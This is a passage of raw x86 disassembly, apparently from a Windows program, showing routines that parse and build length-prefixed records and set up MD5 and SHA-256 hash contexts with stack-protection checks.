  401708:	ff 15 10 80 41 00    	call   *0x418010
  40170e:	8b c6                	mov    %esi,%eax
  401710:	5f                   	pop    %edi
  401711:	5e                   	pop    %esi
  401712:	5d                   	pop    %ebp
  401713:	5b                   	pop    %ebx
  401714:	83 c4 10             	add    $0x10,%esp
  401717:	c3                   	ret
  401718:	8b 44 24 18          	mov    0x18(%esp),%eax
  40171c:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401720:	50                   	push   %eax
  401721:	ff 15 10 80 41 00    	call   *0x418010
  401727:	8b c6                	mov    %esi,%eax
  401729:	5f                   	pop    %edi
  40172a:	5e                   	pop    %esi
  40172b:	5d                   	pop    %ebp
  40172c:	5b                   	pop    %ebx
  40172d:	83 c4 10             	add    $0x10,%esp
  401730:	c3                   	ret
  401731:	8b c7                	mov    %edi,%eax
  401733:	5f                   	pop    %edi
  401734:	5e                   	pop    %esi
  401735:	5d                   	pop    %ebp
  401736:	5b                   	pop    %ebx
  401737:	83 c4 10             	add    $0x10,%esp
  40173a:	c3                   	ret
  40173b:	cc                   	int3
  40173c:	cc                   	int3
  40173d:	cc                   	int3
  40173e:	cc                   	int3
  40173f:	cc                   	int3
  401740:	55                   	push   %ebp
  401741:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  401745:	56                   	push   %esi
  401746:	8b f0                	mov    %eax,%esi
  401748:	83 fe 06             	cmp    $0x6,%esi
  40174b:	72 58                	jb     0x4017a5
  40174d:	53                   	push   %ebx
  40174e:	8d 44 24 10          	lea    0x10(%esp),%eax
  401752:	83 ee 04             	sub    $0x4,%esi
  401755:	50                   	push   %eax
  401756:	8d 5d 04             	lea    0x4(%ebp),%ebx
  401759:	8b c6                	mov    %esi,%eax
  40175b:	c7 07 04 00 00 00    	movl   $0x4,(%edi)
  401761:	e8 4a 0d 00 00       	call   0x4024b0
  401766:	5b                   	pop    %ebx
  401767:	85 c0                	test   %eax,%eax
  401769:	74 21                	je     0x40178c
  40176b:	68 b0 a9 41 00       	push   $0x41a9b0
  401770:	68 f9 04 00 00       	push   $0x4f9
  401775:	68 7c a8 41 00       	push   $0x41a87c
  40177a:	ba 05 00 00 00       	mov    $0x5,%edx
  40177f:	e8 bc 4b 00 00       	call   0x406340
  401784:	83 c4 0c             	add    $0xc,%esp
  401787:	5e                   	pop    %esi
  401788:	33 c0                	xor    %eax,%eax
  40178a:	5d                   	pop    %ebp
  40178b:	c3                   	ret
  40178c:	2b 74 24 0c          	sub    0xc(%esp),%esi
  401790:	66 8b 4c 24 10       	mov    0x10(%esp),%cx
  401795:	83 c6 02             	add    $0x2,%esi
  401798:	01 37                	add    %esi,(%edi)
  40179a:	66 8b 17             	mov    (%edi),%dx
  40179d:	66 89 4d 00          	mov    %cx,0x0(%ebp)
  4017a1:	66 89 55 02          	mov    %dx,0x2(%ebp)
  4017a5:	5e                   	pop    %esi
  4017a6:	b8 01 00 00 00       	mov    $0x1,%eax
  4017ab:	5d                   	pop    %ebp
  4017ac:	c3                   	ret
  4017ad:	cc                   	int3
  4017ae:	cc                   	int3
  4017af:	cc                   	int3
  4017b0:	83 ec 0c             	sub    $0xc,%esp
  4017b3:	55                   	push   %ebp
  4017b4:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4017b8:	56                   	push   %esi
  4017b9:	57                   	push   %edi
  4017ba:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4017be:	8b 57 04             	mov    0x4(%edi),%edx
  4017c1:	85 d2                	test   %edx,%edx
  4017c3:	74 3b                	je     0x401800
  4017c5:	8b cb                	mov    %ebx,%ecx
  4017c7:	e8 84 0c 00 00       	call   0x402450
  4017cc:	53                   	push   %ebx
  4017cd:	8d 74 24 14          	lea    0x14(%esp),%esi
  4017d1:	e8 da 0e 00 00       	call   0x4026b0
  4017d6:	83 c4 04             	add    $0x4,%esp
  4017d9:	85 c0                	test   %eax,%eax
  4017db:	75 23                	jne    0x401800
  4017dd:	68 cc a9 41 00       	push   $0x41a9cc
  4017e2:	68 18 05 00 00       	push   $0x518
  4017e7:	8d 50 01             	lea    0x1(%eax),%edx
  4017ea:	68 7c a8 41 00       	push   $0x41a87c
  4017ef:	e8 4c 4b 00 00       	call   0x406340
  4017f4:	83 c4 0c             	add    $0xc,%esp
  4017f7:	33 c0                	xor    %eax,%eax
  4017f9:	5f                   	pop    %edi
  4017fa:	5e                   	pop    %esi
  4017fb:	5d                   	pop    %ebp
  4017fc:	83 c4 0c             	add    $0xc,%esp
  4017ff:	c3                   	ret
  401800:	8b 57 08             	mov    0x8(%edi),%edx
  401803:	85 d2                	test   %edx,%edx
  401805:	74 3b                	je     0x401842
  401807:	8b cb                	mov    %ebx,%ecx
  401809:	e8 42 0c 00 00       	call   0x402450
  40180e:	53                   	push   %ebx
  40180f:	8d 74 24 14          	lea    0x14(%esp),%esi
  401813:	e8 98 0e 00 00       	call   0x4026b0
  401818:	83 c4 04             	add    $0x4,%esp
  40181b:	85 c0                	test   %eax,%eax
  40181d:	75 23                	jne    0x401842
  40181f:	68 e0 a9 41 00       	push   $0x41a9e0
  401824:	68 1e 05 00 00       	push   $0x51e
  401829:	8d 50 01             	lea    0x1(%eax),%edx
  40182c:	68 7c a8 41 00       	push   $0x41a87c
  401831:	e8 0a 4b 00 00       	call   0x406340
  401836:	83 c4 0c             	add    $0xc,%esp
  401839:	33 c0                	xor    %eax,%eax
  40183b:	5f                   	pop    %edi
  40183c:	5e                   	pop    %esi
  40183d:	5d                   	pop    %ebp
  40183e:	83 c4 0c             	add    $0xc,%esp
  401841:	c3                   	ret
  401842:	8b 17                	mov    (%edi),%edx
  401844:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401848:	c7 45 00 00 00 00 00 	movl   $0x0,0x0(%ebp)
  40184f:	85 d2                	test   %edx,%edx
  401851:	74 24                	je     0x401877
  401853:	6a 0a                	push   $0xa
  401855:	53                   	push   %ebx
  401856:	8d 7c 24 18          	lea    0x18(%esp),%edi
  40185a:	8b c6                	mov    %esi,%eax
  40185c:	e8 df fe ff ff       	call   0x401740
  401861:	83 c4 08             	add    $0x8,%esp
  401864:	85 c0                	test   %eax,%eax
  401866:	0f 84 8d 00 00 00    	je     0x4018f9
  40186c:	8b 44 24 10          	mov    0x10(%esp),%eax
  401870:	01 45 00             	add    %eax,0x0(%ebp)
  401873:	8b 7c 24 20          	mov    0x20(%esp),%edi
  401877:	8b 57 04             	mov    0x4(%edi),%edx
  40187a:	85 d2                	test   %edx,%edx
  40187c:	74 27                	je     0x4018a5
  40187e:	8b 4d 00             	mov    0x0(%ebp),%ecx
  401881:	8b c6                	mov    %esi,%eax
  401883:	2b c1                	sub    %ecx,%eax
  401885:	03 cb                	add    %ebx,%ecx
  401887:	6a 0b                	push   $0xb
  401889:	51                   	push   %ecx
  40188a:	8d 7c 24 18          	lea    0x18(%esp),%edi
  40188e:	e8 ad fe ff ff       	call   0x401740
  401893:	83 c4 08             	add    $0x8,%esp
  401896:	85 c0                	test   %eax,%eax
  401898:	74 5f                	je     0x4018f9
  40189a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40189e:	01 4d 00             	add    %ecx,0x0(%ebp)
  4018a1:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4018a5:	8b 57 08             	mov    0x8(%edi),%edx
  4018a8:	85 d2                	test   %edx,%edx
  4018aa:	74 27                	je     0x4018d3
  4018ac:	8b 4d 00             	mov    0x0(%ebp),%ecx
  4018af:	8b c6                	mov    %esi,%eax
  4018b1:	2b c1                	sub    %ecx,%eax
  4018b3:	03 cb                	add    %ebx,%ecx
  4018b5:	6a 0c                	push   $0xc
  4018b7:	51                   	push   %ecx
  4018b8:	8d 7c 24 18          	lea    0x18(%esp),%edi
  4018bc:	e8 7f fe ff ff       	call   0x401740
  4018c1:	83 c4 08             	add    $0x8,%esp
  4018c4:	85 c0                	test   %eax,%eax
  4018c6:	74 31                	je     0x4018f9
  4018c8:	8b 54 24 10          	mov    0x10(%esp),%edx
  4018cc:	01 55 00             	add    %edx,0x0(%ebp)
  4018cf:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4018d3:	8b 45 00             	mov    0x0(%ebp),%eax
  4018d6:	2b f0                	sub    %eax,%esi
  4018d8:	83 fe 14             	cmp    $0x14,%esi
  4018db:	73 25                	jae    0x401902
  4018dd:	68 b0 a9 41 00       	push   $0x41a9b0
  4018e2:	68 41 05 00 00       	push   $0x541
  4018e7:	ba 05 00 00 00       	mov    $0x5,%edx
  4018ec:	68 7c a8 41 00       	push   $0x41a87c
  4018f1:	e8 4a 4a 00 00       	call   0x406340
  4018f6:	83 c4 0c             	add    $0xc,%esp
  4018f9:	33 c0                	xor    %eax,%eax
  4018fb:	5f                   	pop    %edi
  4018fc:	5e                   	pop    %esi
  4018fd:	5d                   	pop    %ebp
  4018fe:	83 c4 0c             	add    $0xc,%esp
  401901:	c3                   	ret
  401902:	b9 0e 00 00 00       	mov    $0xe,%ecx
  401907:	66 89 0c 18          	mov    %cx,(%eax,%ebx,1)
  40190b:	8d 4f 0c             	lea    0xc(%edi),%ecx
  40190e:	ba 14 00 00 00       	mov    $0x14,%edx
  401913:	66 89 54 18 02       	mov    %dx,0x2(%eax,%ebx,1)
  401918:	8b 31                	mov    (%ecx),%esi
  40191a:	8d 54 18 04          	lea    0x4(%eax,%ebx,1),%edx
  40191e:	89 32                	mov    %esi,(%edx)
  401920:	8b 71 04             	mov    0x4(%ecx),%esi
  401923:	89 72 04             	mov    %esi,0x4(%edx)
  401926:	8b 71 08             	mov    0x8(%ecx),%esi
  401929:	89 72 08             	mov    %esi,0x8(%edx)
  40192c:	8b 49 0c             	mov    0xc(%ecx),%ecx
  40192f:	5f                   	pop    %edi
  401930:	83 c0 14             	add    $0x14,%eax
  401933:	89 45 00             	mov    %eax,0x0(%ebp)
  401936:	5e                   	pop    %esi
  401937:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40193a:	b8 01 00 00 00       	mov    $0x1,%eax
  40193f:	5d                   	pop    %ebp
  401940:	83 c4 0c             	add    $0xc,%esp
  401943:	c3                   	ret
  401944:	cc                   	int3
  401945:	cc                   	int3
  401946:	cc                   	int3
  401947:	cc                   	int3
  401948:	cc                   	int3
  401949:	cc                   	int3
  40194a:	cc                   	int3
  40194b:	cc                   	int3
  40194c:	cc                   	int3
  40194d:	cc                   	int3
  40194e:	cc                   	int3
  40194f:	cc                   	int3
  401950:	8b 06                	mov    (%esi),%eax
  401952:	83 ec 0c             	sub    $0xc,%esp
  401955:	0b 46 04             	or     0x4(%esi),%eax
  401958:	74 25                	je     0x40197f
  40195a:	8d 0c 24             	lea    (%esp),%ecx
  40195d:	51                   	push   %ecx
  40195e:	ff 15 80 80 41 00    	call   *0x418080
  401964:	8b 44 24 04          	mov    0x4(%esp),%eax
  401968:	3b 46 04             	cmp    0x4(%esi),%eax
  40196b:	8b 0c 24             	mov    (%esp),%ecx
  40196e:	7c 0f                	jl     0x40197f
  401970:	7f 04                	jg     0x401976
  401972:	3b 0e                	cmp    (%esi),%ecx
  401974:	76 09                	jbe    0x40197f
  401976:	b8 01 00 00 00       	mov    $0x1,%eax
  40197b:	83 c4 0c             	add    $0xc,%esp
  40197e:	c3                   	ret
  40197f:	33 c0                	xor    %eax,%eax
  401981:	83 c4 0c             	add    $0xc,%esp
  401984:	c3                   	ret
  401985:	cc                   	int3
  401986:	cc                   	int3
  401987:	cc                   	int3
  401988:	cc                   	int3
  401989:	cc                   	int3
  40198a:	cc                   	int3
  40198b:	cc                   	int3
  40198c:	cc                   	int3
  40198d:	cc                   	int3
  40198e:	cc                   	int3
  40198f:	cc                   	int3
  401990:	83 ec 64             	sub    $0x64,%esp
  401993:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401998:	33 c4                	xor    %esp,%eax
  40199a:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  40199e:	53                   	push   %ebx
  40199f:	55                   	push   %ebp
  4019a0:	56                   	push   %esi
  4019a1:	57                   	push   %edi
  4019a2:	68 00 04 00 00       	push   $0x400
  4019a7:	33 ed                	xor    %ebp,%ebp
  4019a9:	e8 43 92 00 00       	call   0x40abf1
  4019ae:	8b f8                	mov    %eax,%edi
  4019b0:	83 c4 04             	add    $0x4,%esp
  4019b3:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4019b7:	85 ff                	test   %edi,%edi
  4019b9:	75 1d                	jne    0x4019d8
  4019bb:	6a 08                	push   $0x8
  4019bd:	ff 15 a8 80 41 00    	call   *0x4180a8
  4019c3:	8b c5                	mov    %ebp,%eax
  4019c5:	5f                   	pop    %edi
  4019c6:	5e                   	pop    %esi
  4019c7:	5d                   	pop    %ebp
  4019c8:	5b                   	pop    %ebx
  4019c9:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  4019cd:	33 cc                	xor    %esp,%ecx
  4019cf:	e8 7b 75 00 00       	call   0x408f4f
  4019d4:	83 c4 64             	add    $0x64,%esp
  4019d7:	c3                   	ret
  4019d8:	33 c0                	xor    %eax,%eax
  4019da:	89 44 24 28          	mov    %eax,0x28(%esp)
  4019de:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4019e2:	89 44 24 30          	mov    %eax,0x30(%esp)
  4019e6:	89 44 24 34          	mov    %eax,0x34(%esp)
  4019ea:	89 44 24 38          	mov    %eax,0x38(%esp)
  4019ee:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4019f2:	89 44 24 40          	mov    %eax,0x40(%esp)
  4019f6:	89 44 24 44          	mov    %eax,0x44(%esp)
  4019fa:	89 44 24 48          	mov    %eax,0x48(%esp)
  4019fe:	8d 44 24 14          	lea    0x14(%esp),%eax
  401a02:	50                   	push   %eax
  401a03:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401a07:	8b cf                	mov    %edi,%ecx
  401a09:	e8 92 fb ff ff       	call   0x4015a0
  401a0e:	83 c4 04             	add    $0x4,%esp
  401a11:	85 c0                	test   %eax,%eax
  401a13:	0f 84 f9 00 00 00    	je     0x401b12
  401a19:	8b 44 24 14          	mov    0x14(%esp),%eax
  401a1d:	bd 01 00 00 00       	mov    $0x1,%ebp
  401a22:	3d 80 00 00 00       	cmp    $0x80,%eax
  401a27:	73 05                	jae    0x401a2e
  401a29:	b8 80 00 00 00       	mov    $0x80,%eax
  401a2e:	8d 34 00             	lea    (%eax,%eax,1),%esi
  401a31:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  401a37:	76 05                	jbe    0x401a3e
  401a39:	be 00 04 00 00       	mov    $0x400,%esi
  401a3e:	56                   	push   %esi
  401a3f:	e8 ad 91 00 00       	call   0x40abf1
  401a44:	8b d8                	mov    %eax,%ebx
  401a46:	83 c4 04             	add    $0x4,%esp
  401a49:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  401a4d:	85 db                	test   %ebx,%ebx
  401a4f:	75 0d                	jne    0x401a5e
  401a51:	6a 08                	push   $0x8
  401a53:	ff 15 a8 80 41 00    	call   *0x4180a8
  401a59:	e9 b4 00 00 00       	jmp    0x401b12
  401a5e:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401a62:	51                   	push   %ecx
  401a63:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  401a67:	52                   	push   %edx
  401a68:	56                   	push   %esi
  401a69:	e8 42 fd ff ff       	call   0x4017b0
  401a6e:	83 c4 0c             	add    $0xc,%esp
  401a71:	85 c0                	test   %eax,%eax
  401a73:	0f 84 8c 00 00 00    	je     0x401b05
  401a79:	8b 44 24 18          	mov    0x18(%esp),%eax
  401a7d:	50                   	push   %eax
  401a7e:	53                   	push   %ebx
  401a7f:	8d 7c 24 64          	lea    0x64(%esp),%edi
  401a83:	e8 88 f9 ff ff       	call   0x401410
  401a88:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  401a8c:	8b 7c 24 4c          	mov    0x4c(%esp),%edi
  401a90:	51                   	push   %ecx
  401a91:	8d 54 24 58          	lea    0x58(%esp),%edx
  401a95:	52                   	push   %edx
  401a96:	b9 60 a6 41 00       	mov    $0x41a660,%ecx
  401a9b:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  401a9f:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%esp)
  401aa6:	00 
  401aa7:	e8 24 36 00 00       	call   0x4050d0
  401aac:	83 c4 10             	add    $0x10,%esp
  401aaf:	85 c0                	test   %eax,%eax
  401ab1:	75 4e                	jne    0x401b01
  401ab3:	b8 10 00 00 00       	mov    $0x10,%eax
  401ab8:	33 c9                	xor    %ecx,%ecx
  401aba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401ac0:	8b 54 0c 5c          	mov    0x5c(%esp,%ecx,1),%edx
  401ac4:	3b 54 0c 4c          	cmp    0x4c(%esp,%ecx,1),%edx
  401ac8:	75 37                	jne    0x401b01
  401aca:	83 e8 04             	sub    $0x4,%eax
  401acd:	83 c1 04             	add    $0x4,%ecx
  401ad0:	83 f8 04             	cmp    $0x4,%eax
  401ad3:	73 eb                	jae    0x401ac0
  401ad5:	8b 44 24 30          	mov    0x30(%esp),%eax
  401ad9:	85 c0                	test   %eax,%eax
  401adb:	74 1f                	je     0x401afc
  401add:	50                   	push   %eax
  401ade:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  401ae2:	e8 c9 0b 00 00       	call   0x4026b0
  401ae7:	83 c4 04             	add    $0x4,%esp
  401aea:	85 c0                	test   %eax,%eax
  401aec:	74 13                	je     0x401b01
  401aee:	e8 5d fe ff ff       	call   0x401950
  401af3:	bd 02 00 00 00       	mov    $0x2,%ebp
  401af8:	85 c0                	test   %eax,%eax
  401afa:	75 05                	jne    0x401b01
  401afc:	bd 03 00 00 00       	mov    $0x3,%ebp
  401b01:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  401b05:	53                   	push   %ebx
  401b06:	e8 09 90 00 00       	call   0x40ab14
  401b0b:	8b 7c 24 28          	mov    0x28(%esp),%edi
  401b0f:	83 c4 04             	add    $0x4,%esp
  401b12:	57                   	push   %edi
  401b13:	e8 fc 8f 00 00       	call   0x40ab14
  401b18:	8b 4c 24 70          	mov    0x70(%esp),%ecx
  401b1c:	83 c4 04             	add    $0x4,%esp
  401b1f:	5f                   	pop    %edi
  401b20:	5e                   	pop    %esi
  401b21:	8b c5                	mov    %ebp,%eax
  401b23:	5d                   	pop    %ebp
  401b24:	5b                   	pop    %ebx
  401b25:	33 cc                	xor    %esp,%ecx
  401b27:	e8 23 74 00 00       	call   0x408f4f
  401b2c:	83 c4 64             	add    $0x64,%esp
  401b2f:	c3                   	ret
  401b30:	83 ec 6c             	sub    $0x6c,%esp
  401b33:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401b38:	33 c4                	xor    %esp,%eax
  401b3a:	89 44 24 68          	mov    %eax,0x68(%esp)
  401b3e:	56                   	push   %esi
  401b3f:	8d 44 24 08          	lea    0x8(%esp),%eax
  401b43:	8b f2                	mov    %edx,%esi
  401b45:	50                   	push   %eax
  401b46:	8d 54 24 14          	lea    0x14(%esp),%edx
  401b4a:	52                   	push   %edx
  401b4b:	8d 44 24 14          	lea    0x14(%esp),%eax
  401b4f:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  401b56:	00 
  401b57:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  401b5e:	00 
  401b5f:	c7 44 24 18 01 23 45 	movl   $0x67452301,0x18(%esp)
  401b66:	67 
  401b67:	c7 44 24 1c 89 ab cd 	movl   $0xefcdab89,0x1c(%esp)
  401b6e:	ef 
  401b6f:	c7 44 24 20 fe dc ba 	movl   $0x98badcfe,0x20(%esp)
  401b76:	98 
  401b77:	c7 44 24 24 76 54 32 	movl   $0x10325476,0x24(%esp)
  401b7e:	10 
  401b7f:	e8 bc 22 00 00       	call   0x403e40
  401b84:	83 c4 08             	add    $0x8,%esp
  401b87:	85 c0                	test   %eax,%eax
  401b89:	75 10                	jne    0x401b9b
  401b8b:	5e                   	pop    %esi
  401b8c:	8b 4c 24 68          	mov    0x68(%esp),%ecx
  401b90:	33 cc                	xor    %esp,%ecx
  401b92:	e8 b8 73 00 00       	call   0x408f4f
  401b97:	83 c4 6c             	add    $0x6c,%esp
  401b9a:	c3                   	ret
  401b9b:	8b 44 24 74          	mov    0x74(%esp),%eax
  401b9f:	85 c0                	test   %eax,%eax
  401ba1:	76 0d                	jbe    0x401bb0
  401ba3:	56                   	push   %esi
  401ba4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401ba8:	e8 33 37 00 00       	call   0x4052e0
  401bad:	83 c4 04             	add    $0x4,%esp
  401bb0:	8d 74 24 10          	lea    0x10(%esp),%esi
  401bb4:	8b cb                	mov    %ebx,%ecx
  401bb6:	e8 c5 37 00 00       	call   0x405380
  401bbb:	85 ff                	test   %edi,%edi
  401bbd:	74 0f                	je     0x401bce
  401bbf:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401bc3:	33 c0                	xor    %eax,%eax
  401bc5:	3b 4c 24 08          	cmp    0x8(%esp),%ecx
  401bc9:	0f 94 c0             	sete   %al
  401bcc:	89 07                	mov    %eax,(%edi)
  401bce:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  401bd2:	5e                   	pop    %esi
  401bd3:	33 cc                	xor    %esp,%ecx
  401bd5:	b8 01 00 00 00       	mov    $0x1,%eax
  401bda:	e8 70 73 00 00       	call   0x408f4f
  401bdf:	83 c4 6c             	add    $0x6c,%esp
  401be2:	c3                   	ret
  401be3:	cc                   	int3
  401be4:	cc                   	int3
  401be5:	cc                   	int3
  401be6:	cc                   	int3
  401be7:	cc                   	int3
  401be8:	cc                   	int3
  401be9:	cc                   	int3
  401bea:	cc                   	int3
  401beb:	cc                   	int3
  401bec:	cc                   	int3
  401bed:	cc                   	int3
  401bee:	cc                   	int3
  401bef:	cc                   	int3
  401bf0:	8b 44 24 08          	mov    0x8(%esp),%eax
  401bf4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401bf8:	50                   	push   %eax
  401bf9:	8b 44 24 10          	mov    0x10(%esp),%eax
  401bfd:	e8 de 36 00 00       	call   0x4052e0
  401c02:	83 c4 04             	add    $0x4,%esp
  401c05:	b8 01 00 00 00       	mov    $0x1,%eax
  401c0a:	c2 0c 00             	ret    $0xc
  401c0d:	cc                   	int3
  401c0e:	cc                   	int3
  401c0f:	cc                   	int3
  401c10:	53                   	push   %ebx
  401c11:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401c15:	55                   	push   %ebp
  401c16:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401c1a:	56                   	push   %esi
  401c1b:	8b 74 24 10          	mov    0x10(%esp),%esi
  401c1f:	57                   	push   %edi
  401c20:	8b 7e 20             	mov    0x20(%esi),%edi
  401c23:	83 e7 3f             	and    $0x3f,%edi
  401c26:	85 ed                	test   %ebp,%ebp
  401c28:	76 29                	jbe    0x401c53
  401c2a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401c30:	8a 03                	mov    (%ebx),%al
  401c32:	88 44 3e 28          	mov    %al,0x28(%esi,%edi,1)
  401c36:	47                   	inc    %edi
  401c37:	43                   	inc    %ebx
  401c38:	83 46 20 01          	addl   $0x1,0x20(%esi)
  401c3c:	83 56 24 00          	adcl   $0x0,0x24(%esi)
  401c40:	4d                   	dec    %ebp
  401c41:	83 ff 40             	cmp    $0x40,%edi
  401c44:	75 09                	jne    0x401c4f
  401c46:	8b d6                	mov    %esi,%edx
  401c48:	33 ff                	xor    %edi,%edi
  401c4a:	e8 b1 31 00 00       	call   0x404e00
  401c4f:	85 ed                	test   %ebp,%ebp
  401c51:	77 dd                	ja     0x401c30
  401c53:	5f                   	pop    %edi
  401c54:	5e                   	pop    %esi
  401c55:	5d                   	pop    %ebp
  401c56:	b8 01 00 00 00       	mov    $0x1,%eax
  401c5b:	5b                   	pop    %ebx
  401c5c:	c2 0c 00             	ret    $0xc
  401c5f:	cc                   	int3
  401c60:	83 ec 64             	sub    $0x64,%esp
  401c63:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401c68:	33 c4                	xor    %esp,%eax
  401c6a:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  401c6e:	33 c0                	xor    %eax,%eax
  401c70:	56                   	push   %esi
  401c71:	89 44 24 18          	mov    %eax,0x18(%esp)
  401c75:	89 44 24 14          	mov    %eax,0x14(%esp)
  401c79:	57                   	push   %edi
  401c7a:	8d 44 24 08          	lea    0x8(%esp),%eax
  401c7e:	8b f9                	mov    %ecx,%edi
  401c80:	50                   	push   %eax
  401c81:	c7 44 24 0c 01 23 45 	movl   $0x67452301,0xc(%esp)
  401c88:	67 
  401c89:	c7 44 24 10 89 ab cd 	movl   $0xefcdab89,0x10(%esp)
  401c90:	ef 
  401c91:	c7 44 24 14 fe dc ba 	movl   $0x98badcfe,0x14(%esp)
  401c98:	98 
  401c99:	c7 44 24 18 76 54 32 	movl   $0x10325476,0x18(%esp)
  401ca0:	10 
  401ca1:	e8 9a 23 00 00       	call   0x404040
  401ca6:	83 c4 04             	add    $0x4,%esp
  401ca9:	85 c0                	test   %eax,%eax
  401cab:	75 11                	jne    0x401cbe
  401cad:	5f                   	pop    %edi
  401cae:	5e                   	pop    %esi
  401caf:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  401cb3:	33 cc                	xor    %esp,%ecx
  401cb5:	e8 95 72 00 00       	call   0x408f4f
  401cba:	83 c4 64             	add    $0x64,%esp
  401cbd:	c3                   	ret
  401cbe:	8d 74 24 08          	lea    0x8(%esp),%esi
  401cc2:	8b cb                	mov    %ebx,%ecx
  401cc4:	e8 b7 36 00 00       	call   0x405380
  401cc9:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  401ccd:	5f                   	pop    %edi
  401cce:	5e                   	pop    %esi
  401ccf:	33 cc                	xor    %esp,%ecx
  401cd1:	b8 01 00 00 00       	mov    $0x1,%eax
  401cd6:	e8 74 72 00 00       	call   0x408f4f
  401cdb:	83 c4 64             	add    $0x64,%esp
  401cde:	c3                   	ret
  401cdf:	cc                   	int3
  401ce0:	83 ec 74             	sub    $0x74,%esp
  401ce3:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401ce8:	33 c4                	xor    %esp,%eax
  401cea:	89 44 24 70          	mov    %eax,0x70(%esp)
  401cee:	8b 44 24 78          	mov    0x78(%esp),%eax
  401cf2:	33 c9                	xor    %ecx,%ecx
  401cf4:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  401cf8:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  401cfc:	57                   	push   %edi
  401cfd:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401d01:	51                   	push   %ecx
  401d02:	50                   	push   %eax
  401d03:	c7 44 24 10 67 e6 09 	movl   $0x6a09e667,0x10(%esp)
  401d0a:	6a 
  401d0b:	c7 44 24 14 85 ae 67 	movl   $0xbb67ae85,0x14(%esp)
  401d12:	bb 
  401d13:	c7 44 24 18 72 f3 6e 	movl   $0x3c6ef372,0x18(%esp)
  401d1a:	3c 
  401d1b:	c7 44 24 1c 3a f5 4f 	movl   $0xa54ff53a,0x1c(%esp)
  401d22:	a5 
  401d23:	c7 44 24 20 7f 52 0e 	movl   $0x510e527f,0x20(%esp)
  401d2a:	51 
  401d2b:	c7 44 24 24 8c 68 05 	movl   $0x9b05688c,0x24(%esp)
  401d32:	9b 
  401d33:	c7 44 24 28 ab d9 83 	movl   $0x1f83d9ab,0x28(%esp)
  401d3a:	1f 
  401d3b:	c7 44 24 2c 19 cd e0 	movl   $0x5be0cd19,0x2c(%esp)
  401d42:	5b 
  401d43:	e8 e8 23 00 00       	call   0x404130
  401d48:	83 c4 08             	add    $0x8,%esp
  401d4b:	85 c0                	test   %eax,%eax
  401d4d:	75 10                	jne    0x401d5f
  401d4f:	5f                   	pop    %edi
  401d50:	8b 4c 24 70          	mov    0x70(%esp),%ecx
  401d54:	33 cc                	xor    %esp,%ecx
  401d56:	e8 f4 71 00 00       	call   0x408f4f
  401d5b:	83 c4 74             	add    $0x74,%esp
  401d5e:	c3                   	ret
  401d5f:	8b c6                	mov    %esi,%eax
  401d61:	8d 7c 24 08          	lea    0x8(%esp),%edi
  401d65:	e8 56 31 00 00       	call   0x404ec0
  401d6a:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  401d6e:	5f                   	pop    %edi
  401d6f:	33 cc                	xor    %esp,%ecx
  401d71:	b8 01 00 00 00       	mov    $0x1,%eax
  401d76:	e8 d4 71 00 00       	call   0x408f4f
  401d7b:	83 c4 74             	add    $0x74,%esp
  401d7e:	c3                   	ret
  401d7f:	cc                   	int3
  401d80:	83 ec 28             	sub    $0x28,%esp
  401d83:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401d88:	33 c4                	xor    %esp,%eax
  401d8a:	89 44 24 24          	mov    %eax,0x24(%esp)
  401d8e:	83 79 1c 00          	cmpl   $0x0,0x1c(%ecx)
  401d92:	53                   	push   %ebx
  401d93:	55                   	push   %ebp
  401d94:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  401d98:	56                   	push   %esi
  401d99:	57                   	push   %edi
  401d9a:	74 07                	je     0x401da3
  401d9c:	8d 71 20             	lea    0x20(%ecx),%esi
  401d9f:	85 f6                	test   %esi,%esi
  401da1:	75 09                	jne    0x401dac
  401da3:	c7 45 00 00 00 00 00 	movl   $0x0,0x0(%ebp)
  401daa:	eb 60                	jmp    0x401e0c
  401dac:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  401db0:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%ebp)
  401db7:	e8 a4 fe ff ff       	call   0x401c60
  401dbc:	85 c0                	test   %eax,%eax
  401dbe:	74 4c                	je     0x401e0c
